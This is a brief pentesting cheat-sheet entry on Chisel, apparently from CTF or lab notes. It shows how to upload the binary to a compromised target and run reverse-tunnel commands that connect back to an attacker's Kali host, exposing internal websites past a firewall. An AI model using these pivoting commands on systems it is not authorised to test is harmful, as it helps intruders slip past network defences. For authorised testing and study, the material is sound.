# Chisel

<div class="row row-cols-lg-2"><div>

[Chisel](https://github.com/jpillora/chisel) <small>(10.5k ⭐)</small> is a post-exploitation tool that can be used to remotely access a website using TCP. This can be useful to access website from your browser will a firewall is blocking connections.

On Kali, you can install it using:

```shell!
$ sudo apt install chisel
```

On the remote target server, you need to get `chisel`

* Use `lscpu` to find which binary is appropriate
* Download the appropriate binary [here](https://github.com/jpillora/chisel/releases/)
* Unzip (`gunzip xxx.gz`) and upload it on the target
</div><div>

**Example: From Kali - Access A Remote Internal Website** 

On Kali, the host, listen for clients:

```shell!
$ chisel server -p cport --reverse
Listening at <chost_ip:cport>
```

On the target, assuming the website is running at `localhost:80`, and we want to access it using `localhost:8080` on Kali, we would use:

```ps
$ ./chisel client chost_ip:cport R:8080:localhost:80
```

If the website is running on another machine such as `xxx.local:8000`, we can simply replace `localhost` with an IP or a Domain Name:

```ps
$ ./chisel client chost_ip:cport R:8080:xxx.local:8000
```

📚 On your Kali machine, you will have to add an entry in your host file: `127.0.0.1 xxx.local`, and use `http://xxx.local:8080`.

⚠️ Remember that you need to use the actual host IP in shells.
</div></div>